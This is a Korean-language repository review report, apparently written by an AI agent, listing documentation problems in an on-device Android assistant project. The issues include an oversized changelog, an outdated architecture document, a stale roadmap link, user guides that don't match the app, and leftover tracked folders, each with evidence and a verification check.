일부·Redaction·AppLogger·WikipediaSearchToolImpl 을 읽었다. 회귀 세트는 scratch/lab/regression/run.py 의 상수·가드 흉내·turn()(약 1~392행)과 kosmos_lab.py 전체를 읽고 Kotlin 원문과 줄 단위로 대조했다(run.py 의 세트 정의 394행 이후와 영어 턴 함수는 목차만).

못 읽은/안 한 것: gradle·테스트·실험은 규칙대로 실행하지 않았다 — 따라서 '간헐 실패'는 코드 구조와 CHANGELOG 기록으로만 판단했고, tests-9 의 직렬화 플러그인 제거 가능 여부와 tests-10 의 낱말 경계 동작은 실행 확인이 없는 추정이다(각 항목에 표시). 그래프 도구(codebase-memory-mcp)는 쓰지 않고 grep·파일 읽기로만 확인했다. ScreenCatalogTest(1,021줄)·BaseAgentStreamTest(679줄) 본문 전체, 나머지 ViewModel·실행기 테스트 대부분, lint 보고서, 스키마 JSON 내용은 읽지 않았다. lint 전용 설정 파일(lint.xml·baseline)은 없고 .github/ 도 없다.

버린 항목(10건 초과 또는 가치 부족, 6건): ① compose-richtext·commonmark 1.0.0-alpha05(알파 의존성) — CHANGELOG 0.41.x 에 이미 알고 우회(SyncMarkdown)한 기록이 있고 안정판 유무를 확인할 수 없어 제외. ② WikipediaSearchToolImpl 에 응답 파싱 테스트 없음 — 호스트가 코드에 고정돼 MockWebServer 로 돌리려면 제품 코드 변경이 필요하고 웹 검색은 기본 꺼짐이라 후순위. ③ AppNavHost.navigateBack 루트 가드(AGENTS §2-⑥ 불변식)에 테스트 없음 — 4줄짜리 가드라 가치가 낮아 제외. ④ 앱 versionName/versionCode 와 CHANGELOG 맨 위 버전이 같은지 보는 테스트 제안, 그리고 USER_GUIDE 머리의 기준 버전이 0.42.7 로 앱(0.42.10)보다 뒤처진 점 — 문서 영역이고 사소해 제외(문서 담당이 볼 만함). ⑤ 테스트 JVM 힙 크기 미지정(Gradle 기본값) + 병렬 4개 + 화면 캡처 — 메모리 부족 실패 기록이 없어 근거 부족으로 제외. ⑥ -Pfast 분리 자체는 타당하다고 판단(CHANGELOG 0.40.3 M4 측정 근거, 회차 게이트는 전체) — 다만 그 결과 ChatViewModel 이 빠른 반복에서 0% 가 되는 점만 tests-6 에 반영. 사용자 결정(릴리스 빌드 보류·master 직접 커밋·화면 가리기 금지 등)을 뒤집는 제안은 넣지 않았다. 모델 입력을 바꾸는 제안은 없다(tests-2 는 실험실 흉내만 앱에 맞추는 것이라 false 로 표시했지만, 흉내를 고치면 회귀 세트 점수가 기준과 달라질 수 있어 한 번 돌려 차이를 기록해야 한다).

</details>

## 문서·포트폴리오 (docs)

### docs-1 · 변경 이력 파일이 630KB 라 GitHub 에서 서식 없이 원문 글자로만 보인다
- 판정 일부만 맞음 · 중요도 중간 · 크기 M
- 왜: GitHub 는 512KB 를 넘는 글 파일을 마크다운으로 바꿔 보여 주지 않고 원문 글자 그대로 보여 준다(GitHub 문서의 저장소 한도 항목, 내 기억 기준 — 이 환경에서 직접 열어 확인하지는 못했다). 코드 검색도 384KB 넘는 파일은 색인하지 않는다. 즉 공개 저장소에서 면접관이 '실측 수치의 근거'를 눌러 들어가면 표가 전부 깨진 긴 글자 덩어리를 보게 되고, 버전 번호로 검색도 안 된다. 포트폴리오의 핵심 주장(추정이 아니라 실측으로 결정)이 기대는 문서라 영향이 크다. 회차마다 약 5~10KB 씩 늘어 계속 나빠진다.
- 제안: 버전대별로 나눈다. 예: docs/changelog/0.42.md, 0.41.md, 0.40.md, 0.38-0.39.md, 0.20-0.37.md, 0.2-0.19.md 로 옮기고, docs/CHANGELOG.md 는 '지금 주제(0.42.x) 본문 + 나머지 버전대 파일 링크 표'만 남긴다(각 파일 300KB 이하). 다른 문서가 'CHANGELOG 0.41.6'처럼 버전 번호로만 가리키므로 줄 번호 링크는 깨지지 않는다. AGENTS.md 머리의 '회차별 이력은 docs/CHANGELOG.md 가 진실' 문장과 문서 지도에 '지난 버전대는 docs/changelog/'를 한 줄 더한다. 나누기 전에 실제 GitHub 페이지에서 지금 파일이 어떻게 보이는지 먼저 한 번 열어 확인한다.
- 근거:
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/docs/CHANGELOG.md — 파일 크기 630,170바이트·1,746줄(wc -c 로 확인). 한 줄이 최대 3,238바이트, 2,000바이트 넘는 줄이 7개
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/docs/CHANGELOG.md — 버전대별 크기를 재 보면 0.37 이하가 약 315KB, 0.38 약 72KB, 0.39 약 28KB, 0.40 약 67KB, 0.41 약 89KB, 0.42 약 41KB
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/README.md:134 — 문서 지도가 이 파일을 '회차별 기록 — 결함의 원인과 실측 수치까지'로 소개하고, 결정 설명 문서들도 'CHANGELOG 0.xx.x'로 근거를 가리킨다
- 검증: 크기는 맞다: docs/CHANGELOG.md 630,170바이트·1,746줄, 2,000바이트 넘는 줄 7개(wc·awk 로 확인). README.md:134 가 이 파일을 '실측 수치까지'로 소개하는 것도 맞다. 다만 핵심 전제인 'GitHub 는 512KB 넘는 파일을 서식 없이 보여 준다'는 제안자도 나도 이 환경에서 확인하지 못했다(추정). 그래서 '깨져 보인다'는 결과는 미확인이고, 확인된 것은 '파일이 매우 크고 회차마다 커진다'뿐이다. 제안의 마지막 문장(나누기 전에 실제 GitHub 페이지에서 먼저 확인)을 첫 단계로 삼아야 하고, 그 결과가 정상 표시면 우선순위는 낮다. 나눌 경우 AGENTS.md 머리의 '회차별 이력은 docs/CHANGELOG.md 가 진실' 문장과 CHANGELOG 를 버전 번호로 가리키는 문서들이 걸리므로 사용자 결정이 필요하다.
- 앞선 기록: docs/plans/0.39.x-roadmap.md '확인 부채·기록 형식'(항목 형식만). CHANGELOG·plans·AGENTS.md 에서 '512KB'·'changelog/'·파일 나누기 검색 0건

### docs-2 · 구조 문서의 앞 절반(1~14절, 약 1,260줄)이 지금 없는 설계를 현재형으로 설명하고, 결정 기록 40개에는 목차가 없다
- 판정 확인됨 · 중요도 중간 · 크기 M
- 왜: README 에서 '구조'를 눌러 들어온 면접관이 처음 1,260줄 동안 읽는 것은 지금 코드에 없는 클래스·흐름이다. 맨 위 안내 한 줄을 놓치면 '문서와 코드가 다르다'로 읽히고, 안내를 봤더라도 '그럼 지금 구조는 어디 있나'에 답하는 글이 README 의 그림 두 장 말고는 없다. 결정 기록은 내용이 좋지만 40개를 찾아갈 목차가 없어 README 가 번호로 가리키는 결정(예: 31·37·40번)을 찾으려면 2천 줄 파일에서 직접 검색해야 한다. 에이전트가 새 툴을 넣을 때 13-2절('TaskRouter 규칙 추가')을 따르면 AGENTS.md 의 절차와 어긋나는 위험도 있다.
- 제안: ① 1~14절을 통째로 docs/archive/v0-design-2026-07/architecture-v0.md 로 옮긴다(이미 쓰는 보관 폴더 방식 그대로, 보관 이유를 폴더 README 에 한 줄). ② 그 자리에 지금 구조를 100~150줄로 새로 쓴다: 모듈 4개와 의존 방향, 한 턴의 흐름(입력 → 오케스트레이터 → 에이전트 루프 → 실행 전 가드 → 승인 → 툴 → 답 후처리), 토큰 예산 사슬(상수 이름과 불변식 테스트 링크만, 숫자는 베끼지 않음), 시작·백그라운드 수명주기, 기억 3종(프로필·메모·지난 대화)과 검색 경로. ③ 결정 기록 맨 위에 표를 둔다: 번호 · 한 줄 제목 · 상태(현행 / 일부 바뀜 → 몇 번 / 처방 바뀜 → 몇 번) · 사람이 읽는 설명 문서 링크. 본문은 그대로 둔다. ④ 목차에 15절을 넣는다.
- 근거:
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/docs/architecture.md:1-4 — 제목이 'Local Friday', 최종 수정 2026-07-31. 4번째 줄에 '1~14절은 v0 당시 기록'이라는 안내 한 줄만 있음
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/docs/architecture.md:376,623,791,1212,1220 — TaskRouter·IntentClassifier 로 의도를 분류해 에이전트를 고르는 구조를 설명. 실제 소스에는 TaskRouter.kt·IntentClassifier.kt·SpeechToTextTool.kt·ResponseParser.kt·CalendarAgent.kt·PreExecutionGuard.kt 가 없다(git ls-files 로 0건 확인). 같은 파일 1317줄의 결정 기록 8번이 '라우터 폐지'
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/docs/architecture.md:120,475,818-840 — 음성을 안드로이드 음성 인식기로 처리한다고 설명(지금은 모델이 직접 전사)
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/docs/architecture.md:842-877 — 모델이 action JSON 을 출력한다는 스키마(지금은 네이티브 함수 호출)
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/docs/architecture.md:968,1196,1256 — DB 버전 1, '스트리밍 응답: 비스트리밍 고정', '멀티모듈 Gradle 분리는 하지 말 것'(지금은 4모듈·스트리밍)
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/docs/architecture.md:16-31 — 목차가 1~14절만 싣고 15절(결정 기록)은 없다. 1263~2298줄에 결정 기록 40개가 목록·상태 표 없이 이어지고, 큰 것은 한 건이 6~9KB
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/README.md:133 — 이 파일을 '구조 + ADR(모든 주요 결정의 맥락과 근거)'로 소개
- 검증: docs/architecture.md:1-4 제목 'Local Friday'·최종 수정 2026-07-31·4번째 줄 '읽는 법(0.41.6)' 안내 한 줄 확인. 16-31줄 목차는 1~14절만 있고 15절(1261줄 '## 15. 아키텍처 결정 기록')은 빠져 있다. '### ADR-' 제목은 40개. git ls-files 에서 TaskRouter·IntentClassifier·SpeechToTextTool·ResponseParser·CalendarAgent·PreExecutionGuard 0건. 0.41.6 에서 표지를 달아 '문서와 코드가 다르다'는 오해는 일부 줄였으므로 high 는 과하고 medium 이 맞다 — 남은 빈틈은 '지금 구조를 설명하는 글이 없다'와 '결정 기록 40개에 목차·상태 표가 없다' 두 가지다. 개별 줄(376·623·842-877·968 등)의 본문까지는 다 읽지 않았지만 표지 문장 자체가 1~14절이 옛 설계임을 인정한다.
- 앞선 기록: CHANGELOG 0.41.6 [Docs]·docs/plans/0.41.6-evaluation-fixes.md:24,73 — 1~14절 머리에 'v0 설계 당시 기록' 표지와 버전 열 링크화만 함(옮기기·현행 구조 새로 쓰기는 기록 없음)

### docs-3 · README 가 '앞으로의 순서'로 이미 끝난 0.39.x 로드맵을 가리키고, 지금 따르는 6단계 순서는 어느 문서에도 없다
- 판정 확인됨 · 중요도 중간 · 크기 S
- 왜: 포트폴리오: README 의 '다음 계획' 링크를 누르면 3주 전에 끝난 계획이 나와 관리가 멈춘 저장소처럼 보인다. 39 대 40 처럼 베낀 숫자가 낡는 것은 AGENTS.md 가 스스로 금지한 일(수치는 베끼지 말고 링크로)이라 면접에서 지적받기 쉽다. 실사용: 다음 단계가 '매일 쓰면서 고치기'인데 열린 일·지켜볼 것·다음 후보가 세 군데에 흩어져 있어, 쓰다 본 문제를 어디에 적고 무엇부터 볼지 정할 한 곳이 없다.
- 제안: docs/ROADMAP.md 를 한 장 만든다: ① 6단계 순서와 각 단계 상태·해당 버전 ② 지금 열린 일 표(채팅 할 일 툴, 기억→알림, 두 엔진이 GPU 에 같이 있을 때 채팅 답 깨짐의 근본 원인, 끝 시각 다시 묻기, 한글 옛 형식 등 — 각 줄에 근거 기록 링크) ③ 실사용 관찰 기록 표(날짜·무슨 말을 했나·무엇이 나왔나·활동 기록이나 진단 파일 유무·처리). README 71·135줄과 docs/README.md 9줄을 이 문서로 바꾸고 0.39.x 로드맵은 '지난 로드맵'으로 내린다. README 30줄의 '39개'는 숫자를 빼고 '결정 기록(ADR)'로만 쓰거나 '40여 개'로.
- 근거:
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/README.md:71 — '앞으로의 순서는 0.39.x 로드맵에 있습니다'
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/README.md:135 — 문서 지도 '0.39.x 로드맵 | 다음 회차들과 그 근거'. docs/README.md:9 도 같은 링크
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/docs/plans/0.39.x-roadmap.md:1 — '상태: 완료 (2026-11-01 …)'. 본문은 문서 검색을 '추후 보류'로 적었지만 0.41.x 에서 이미 구현됨
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/docs/CHANGELOG.md:97 — 지금 순서(2026-11-18 사용자 승인: 1 작은 모델 행동 → 2 여러 단계 → 3 앱 결함 → 4 실사용 준비 → 5 실사용 → 6 포트폴리오)는 이 한 줄과 계획서 머리말(docs/plans/0.42.5-…md:5, 0.42.10-…md:5)에만 있다
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/README.md:30 — '결정 기록 ADR 39개'. 실제 제목은 40개(architecture.md 에서 '### ADR-' 40건)이고 같은 README 66줄이 ADR-040 을 인용한다
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/docs/CHANGELOG.md — '다음 후보' 메모가 12곳에 흩어져 있고, 열린 일은 docs/plans/0.42.10-real-use-start-check.md '열린 것'과 docs/checklists/device_gate.md 의 '실사용 중 지켜볼 것' 줄에 따로 있다
- 검증: README.md:71 '앞으로의 순서는 0.39.x 로드맵에', README.md:135 문서 지도 '0.39.x 로드맵 | 다음 회차들과 그 근거', docs/README.md:9 같은 링크 — 모두 확인. 그 로드맵 첫 줄은 '상태: 완료 (2026-11-01 …)'. README.md:30 'ADR 39개'인데 architecture.md 의 '### ADR-' 는 40개이고 README.md:66 이 ADR-040 을 인용한다(베낀 숫자가 낡은 실제 사례 — AGENTS.md §3-② 위반). 6단계 순서 인용 줄은 CHANGELOG 96줄(제안의 97줄과 한 줄 차이). '다음 후보가 12곳'이라는 수는 세어 보지 않았다. 링크·숫자 교정은 작고 확실하고, 새 ROADMAP 문서를 만들지는 사용자 취향 문제다.
- 앞선 기록: docs/plans/0.39.x-roadmap.md:1 '상태: 완료(2026-11-01)'. 6단계 순서는 CHANGELOG 0.42.5 머리말(docs/CHANGELOG.md:96)과 docs/plans/0.42.5-…md:5 에만. README 링크 교체 기록 없음

### docs-4 · 사용 안내(한·영 모두)가 앱의 실제 화면 길과 다르다 — 활동 기록 위치, 메모·할 일 화면 누락, 문서 형식, 채팅 할 일
- 판정 확인됨 · 중요도 중간 · 크기 S
- 왜: 실사용·공개 양쪽: 안내대로 '설정'에서 활동 기록을 찾으면 없다. 개인정보 절(6장)이 '모든 실행이 기록된다'의 확인 장소를 틀리게 알려 주는 셈이라 신뢰 설명이 약해진다. 한국에서 '한글 파일'은 보통 .hwp 를 뜻하는데 그것은 열리지 않는다 — 시연 때 .hwp 를 건네받으면 바로 드러난다. '할 일 추가해 줘'가 안 되는 것은 0.42.10 에서 화면 문구만 고쳤고 안내에는 한 줄도 없다.
- 제안: 한·영 안내를 함께 고친다: ① 활동 기록을 '왼쪽 메뉴 › 활동 기록'으로, 설정 항목 나열에서 빼기 ② '다른 화면' 목록에 '메모·할 일'(메모 목록, 할 일 탭, 백업 내보내기·가져오기 메뉴) 추가 ③ 문서 형식을 '엑셀(xlsx)·워드(docx)·한글(hwpx)'로 쓰고 '옛 형식 xls·doc·hwp 는 열 수 없음' 한 줄(README 40줄도 같이) ④ 7장에 '할 일은 메모·할 일 화면에서 직접 적는다 — 채팅으로는 추가·조회가 안 되고 아침 브리핑만 읽는다' ⑤ 기준 버전·날짜 갱신. 고친 뒤 메뉴 항목 이름 5개와 설정 구역 이름을 strings.xml 과 한 번 대조한다.
- 근거:
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/docs/guide/USER_GUIDE.md:77,83 — 활동 기록을 '설정' 안 항목으로, '설정 › 활동 기록'으로 안내(영어판 77-78,83 줄도 같음)
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/java/com/kosmos/app/feature/drawer/AppDrawerContent.kt:164 — 활동 기록은 왼쪽 메뉴의 독립 항목. 설정 화면 파일(feature/settings/SettingsScreen.kt)에는 활동 기록으로 가는 코드가 없다(grep 0건). 설정 구역 이름은 strings.xml:420-465 의 AI 모델·화면·대화·아침 브리핑·기억·음성·알림·데이터뿐
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/docs/guide/USER_GUIDE.md:71-79 — '다른 화면' 목록에 지난 대화·일정·문서·프로필·설정만 있고 '메모·할 일' 화면이 없다. 그런데 78줄은 '백업은 메모 화면의 메뉴에'라고 한다. 실제 메뉴에는 '메모·할 일'(app/src/main/res/values/strings.xml:220, AppDrawerContent.kt:162)이 있다
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/docs/guide/USER_GUIDE.md:74 와 README.md:40 — 'PDF·엑셀·CSV·워드·한글'. 실제 지원은 xlsx·docx·hwpx 뿐(domain/src/main/java/com/kosmos/app/domain/document/DocumentType.kt:52)이고 앱 문구도 '옛 형식(xls, doc, hwp)'은 못 연다고 한다(strings.xml:378,382). 영어판 74줄만 'Hangul (hwpx)'로 적음
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/docs/CHANGELOG.md:4-7 — 0.42.10 이 '채팅에는 할 일 추가 툴이 처음부터 없다, 채팅은 날짜 없는 할 일을 못 본다'를 확인했지만 안내 7장(알아 두면 좋은 것)에는 없다
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/docs/guide/USER_GUIDE.md:4 — 기준 버전 0.42.7(앱은 0.42.10 — app/build.gradle.kts:24)
- 검증: docs/guide/USER_GUIDE.md:4 기준 0.42.7(앱은 app/build.gradle.kts:24 의 0.42.10). 77줄이 '활동 기록'을 설정 항목으로 나열하고 83줄이 '설정 › 활동 기록'이라 하지만, AppDrawerContent.kt:164 에서 활동 기록은 왼쪽 메뉴의 독립 항목이고 feature/settings/SettingsScreen.kt 에는 활동 기록으로 가는 코드가 없다(grep 결과 ActivityResult 류만). 71-79줄 '다른 화면' 목록에 '메모·할 일'이 없는데 78줄은 '백업은 메모 화면의 메뉴'라고 한다 — 실제 메뉴 항목은 strings.xml:220 '메모·할 일', 백업 메뉴는 feature/memory/MemoryComponents.kt:55. 문서 형식: 74줄과 README.md:40 은 '엑셀·워드·한글'로만 쓰고(hwp/hwpx 언급 0건), DocumentType.kt:52 는 pdf·xlsx·csv·docx·hwpx 만, strings.xml:382 는 '옛 형식(xls, doc, hwp)'을 못 연다고 한다. 영어판 74줄만 'Hangul (hwpx)'. 안내에서 '할 일'은 73·79줄뿐이라 채팅으로 할 일 추가가 안 된다는 설명은 없다. AGENTS.md §1 의 '사용 안내 함께 고치기' 규칙에도 해당한다.
- 앞선 기록: CHANGELOG 0.42.10 [Fix]·[Note](할 일 빈 화면 문구만 수정, 채팅 할 일 툴은 다음 후보). docs/plans/unscheduled-hwp.md(옛 한글 형식 보류). 안내의 활동 기록 경로·메모 화면 누락은 기록 없음

### docs-5 · 영어 사용 안내가 화면 이름을 한국어로 인용한다 — 영어 모드 사용자는 그 글자를 볼 수 없다
- 판정 확인됨 · 중요도 낮음 · 크기 S
- 왜: README 가 한·영 전환 지원을 기능으로 내세우는데(0.40.0), 영어 안내는 한국어 화면을 전제로 쓰여 있다. 영어로 앱을 쓰는 사람은 안내에 적힌 한글 이름을 화면에서 찾을 수 없고, 안내의 'running hot'은 실제 화면의 'Heat'와도 다르다. 공개 저장소에서 영어 안내를 읽는 사람이 실제 대상 독자다.
- 제안: 영어 안내의 화면·버튼 이름을 values-en/strings.xml 의 실제 글자로 바꾸고, 한국어 이름 괄호는 지운다(필요하면 맨 위에 '한국어 화면 이름은 한국어 안내 참고' 한 줄). 영어 예시 문장 옆 한국어 예시는 그대로 둬도 된다. docs-4 를 고칠 때 같이 한다.
- 근거:
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/docs/guide/USER_GUIDE.en.md:29-30 — 'tap the download button (모델 내려받기)', 'Settings › AI model (설정 › AI 모델)'
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/docs/guide/USER_GUIDE.en.md:69 — 상태 상자 문구를 '발열 주의'·'엔진 오류'·'모델 없음'으로 인용
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/docs/guide/USER_GUIDE.en.md:72-76 — 화면 이름마다 (지난 대화)(일정)(문서)(보관함)(프로필), '채팅으로' 버튼을 한국어로
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/res/values-en/strings.xml:59,73,74,76,216-220,361 — 영어 모드에서 실제로 보이는 글자는 'Download model', 'Engine error', 'No model', 'Heat', 'Calendar', 'Notes & To-dos', 'Documents', 'Activity Log', 'Settings', 'To chat'
- 검증: docs/guide/USER_GUIDE.en.md:29-30 '(모델 내려받기)'·'(설정 › AI 모델)', 69줄 '발열 주의'·'엔진 오류'·'모델 없음', 72-77줄 화면 이름 뒤 한국어 괄호와 '채팅으로' 확인. 영어 모드 실제 글자는 values-en/strings.xml:59 'Download model', 73-76 'Engine error'·'No model'·'Heat', 216-220 'Calendar'·'Notes & To-dos'·'Documents'·'Activity Log'·'Settings', 361 'To chat'. 안내의 'Schedule'·'running hot'은 화면의 'Calendar'·'Heat' 와도 다르다. 영어는 보조 기능이라(README.md:69 '영어는 보조 기능이라 한계로 둠') 낮은 등급이 맞고, docs-4 와 같이 고치면 된다.
- 앞선 기록: CHANGELOG 0.40.0(한·영 지원) — 영어 안내의 화면 이름 정리 기록 없음

### docs-6 · 낡은 문서 여섯 개가 '현행'처럼 색인돼 있고 서로·AGENTS.md 와 모순된다
- 판정 확인됨 · 중요도 중간 · 크기 M
- 왜: 유지보수: 새 세션의 에이전트가 docs/plans/README.md 나 api_spec.yaml 을 '규칙'으로 읽으면 폐기된 분업·없는 인터페이스를 따를 수 있다(보관 폴더 README 가 스스로 경고한 바로 그 위험). 포트폴리오: 문서 지도에서 PRD·문서 작성 규칙을 누른 사람이 다른 이름의 제품, 지켜지지 않는 규칙, 다른 사람 PC 경로를 본다. '문서를 관리한다'는 인상과 반대다.
- 제안: ① docs/plans/README.md 를 지금 방식(한 세션에서 계획→구현, 상태 줄 규칙, 모델 입력을 바꾸는 회차는 실측 먼저)으로 10줄 안팎 다시 쓴다. ② DOCUMENTATION_GUIDE.md·trouble_shooting.md·expand.md·nvidia_skills_analysis.md·tasks.md 를 docs/archive/ 의 날짜 폴더로 옮기고 보관 이유 한 줄씩(살릴 것이 있으면 AGENTS.md 에 한 줄). ③ api_spec.yaml 은 테스트가 읽는 활동 기록 종류 목록만 남긴 작은 파일로 줄이거나, 통째로 보관 폴더로 옮기고 테스트의 파일 경로만 고친다(단언은 그대로 — 경로 변경이라 단언 수정 규칙에 걸리지 않지만 사용자에게 먼저 보인다). ④ PRD.md 는 머리에 'v0~v1 요구사항 기록, 현행 기능은 README·사용 안내' 표지를 달고 573줄 모순을 고치거나 보관한다. ⑤ docs/README.md 색인과 README 문서 지도를 맞춘다.
- 근거:
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/docs/plans/README.md:3-4,17 — '계획 세션(Claude)이 계획을 남기고 구현 세션(Antigravity/Gemini)이 수행(2026-09-02 분업 결정)', '마지막 마일스톤은 expand.md 상태 갱신'. AGENTS.md §2-① 과 docs/agent_workflow_guide.md:4 는 이 분업을 2026-10-27 에 폐기했다고 적는다
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/docs/api_spec.yaml:1-40,674-723 — 제목 'Local Friday', 스스로를 '내부 계약의 진실'이라 하고 없는 인터페이스(SpeechToTextTool 등)의 계약을 2,155줄에 걸쳐 정의. docs/README.md:18 은 이것을 '기록용'이 아니라 '내부 계약'으로 색인
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/test/java/com/kosmos/app/contract/AuditEventTypeSpecTest.kt:11-69 — 다만 이 테스트가 api_spec.yaml 의 활동 기록 종류 목록을 읽으므로 파일을 그냥 옮기면 테스트가 깨진다
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/docs/PRD.md:1-2,10,217,573 — 제목 'Local Friday', 2026-08-09 판, 'Windows 확장'. 217줄 '별도 음성 인식 엔진을 두지 않는다'와 573줄 '안드로이드 온디바이스 음성 인식 의존'이 서로 모순. 에피소드 기억·문서 보관함·영어 모드 등 그 뒤 기능은 없음. README.md:138 은 '제품 요구사항'으로 소개
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/docs/DOCUMENTATION_GUIDE.md:17,43,64,71 — '모든 문서에 표준 머리말 필수', 변경 이력 태그 [Feature]·[Refactoring], 'README 버전 동기화' — 지금 문서들은 따르지 않는다. 64줄 예시에는 다른 PC 의 절대 경로 file:///c:/Users/J/Desktop/J-Dev/… 가 박혀 있다
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/docs/trouble_shooting.md:1-5 — 2026-07-31 판 'Local Friday', Phase·TASK 번호 시절의 컴파일 오류 기록. docs/expand.md:3 — '상태: Draft (검토 대기)'인데 docs/README.md:10 은 '이전 로드맵'
- 검증: docs/plans/README.md:3-4 '계획 세션(Claude)… 구현 세션(Antigravity/Gemini)… 2026-09-02 분업 결정', 17줄 'expand.md 상태' — AGENTS.md §2-① 의 2026-10-27 분업 폐기와 정면으로 어긋난다(에이전트가 실제로 읽는 폴더라 여섯 중 가장 실질적). docs/api_spec.yaml:1-12 제목 'Local Friday', 2,155줄, docs/README.md:18 은 '내부 계약'으로 색인. AuditEventTypeSpecTest.kt:11-57 이 이 파일을 읽으므로 옮기면 경로를 같이 고쳐야 한다는 주의도 맞다. docs/PRD.md:1-2 'Local Friday'·2026-08-09, 217줄 '별도 STT 엔진을 두지 않는다' 대 573줄 'Android 온디바이스 STT 의존' 모순 확인. DOCUMENTATION_GUIDE.md:64 에 file:///c:/Users/J/… 경로 확인. trouble_shooting.md:1-5 2026-07-31 판 확인. 일부 과장: tasks.md·nvidia 분석·expand.md 는 색인에서 이미 '기록용/이전'으로 표시돼 있어 '현행처럼 색인'은 plans/README·api_spec·PRD·DOCUMENTATION_GUIDE·trouble_shooting 다섯에만 해당한다. api_spec 을 줄이거나 옮기는 일은 테스트가 걸려 있어 사용자에게 먼저 보여야 한다.
- 앞선 기록: CHANGELOG 0.41.6 [Docs] — 옛 평가 문서 2개만 보관 폴더로. docs/README.md:19 가 tasks.md·nvidia 분석은 이미 '현행 기준이 아니다'로 표시, expand.md 는 10줄에서 '확장 로드맵(이전)'으로 표시. 나머지는 기록 없음

### docs-7 · 저장소 첫 화면에 쓰이지 않는 것 세 가지가 추적되고 있다 — 웹 시안 폴더, 옛 문서 사본 폴더, 깃 기록 덤프 파일
- 판정 확인됨 · 중요도 중간 · 크기 S
- 왜: 포트폴리오: GitHub 저장소 첫 화면의 폴더 목록에 띄어쓰기가 든 'On-device AI Assistant App' 과 docs 옆의 documents, 정체 모를 .patch 파일이 보인다 — 처음 보는 사람이 가장 먼저 보는 곳이다. 유지보수: 웹 시안 폴더의 CLAUDE.md·AGENTS.md 와 documents/v0/agent_rules.md 는 '최우선 규칙'을 자처하는 옛 지침이라, 에이전트가 그 폴더에서 일하거나 검색으로 집으면 지금 규칙과 부딪친다(보관 폴더를 만든 이유와 같은 위험).
- 제안: 사용자 확인 뒤(추적 파일 삭제라 미리 목록을 보인다): ① wiki_history.patch 는 git rm — 같은 내용이 깃 이력에 있다. ② 'On-device AI Assistant App/' 은 쓰지 않으면 git rm, 초기 시안으로 남기고 싶으면 docs/archive/web-prototype-2026-08/ 로 옮기고 안의 AGENTS.md·CLAUDE.md 는 지운다. ③ documents/v1 은 docs/ 와 겹치므로 git rm, documents/v0 과 project_journey 는 docs/archive/v0-planning-2026-05/ 로 옮기고 README 에 '따르지 말 것' 한 줄(agent_rules.md 포함). .gitignore 5번 구역(웹 시안 node_modules)도 같이 정리한다. 지우는 것은 전부 깃 이력에 남는다.
- 근거:
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/wiki_history.patch — 4,397바이트, 2026-07-19 커밋 하나의 git log 출력(작성자 메일 주소 줄 포함). .gitignore 53줄에 '*.patch' 규칙이 있는데도 추적 중(git ls-files 에 나옴)
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/On-device AI Assistant App/ — 추적 파일 12개(Figma Make 로 만든 React 웹 시안: package.json, src/App.tsx 등). 안에 자체 AGENTS.md('figma-make-app …')와 CLAUDE.md('@AGENTS.md')가 있다
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/documents/ — 추적 파일 15개·약 390KB. v1/ 은 docs/ 의 옛 사본(documents/v1/tasks.md 76,264바이트 ≈ docs/tasks.md 76,218바이트, PRD·architecture·api_spec·DESIGN 도 같은 식), v0/ 은 PDF 3개와 agent_rules.md(46,695바이트 — 3번째 줄대 '이 문서의 규칙이 다른 일반 관행보다 항상 우선한다')
  - README.md, docs/README.md, AGENTS.md, docs/CHANGELOG.md 를 'documents/', 'On-device AI Assistant', 'wiki_history' 로 검색하면 0건 — 어디서도 가리키지 않는다
- 검증: git ls-files 로 확인: wiki_history.patch 추적 중(.gitignore 의 '*.patch' 는 57줄 — 제안의 53줄은 틀림, 추적 뒤에 규칙이 생겨 그대로 남은 것), 'On-device AI Assistant App/' 12개(자체 AGENTS.md·CLAUDE.md 포함, package.json·src/App.tsx 등), 'documents/' 15개(v0 의 PDF 3개·agent_rules.md·plan.md, v1 의 PRD·architecture·api_spec·DESIGN·tasks·trouble_shooting·checklists 2개, project_journey 2개). README.md·docs/README.md·AGENTS.md·CHANGELOG·architecture·plans 에서 'documents/'·'On-device AI Assistant'·'wiki_history' 검색 0건(.gitignore 49-50줄의 node_modules·dist 규칙만). 파일 크기와 agent_rules.md 의 '최우선 규칙' 문구는 열어 보지 않았다. 추적 파일 삭제이므로 목록을 보여 주고 사용자 확인을 받아야 한다. 일부러 남겼다는 기록은 찾지 못했다.

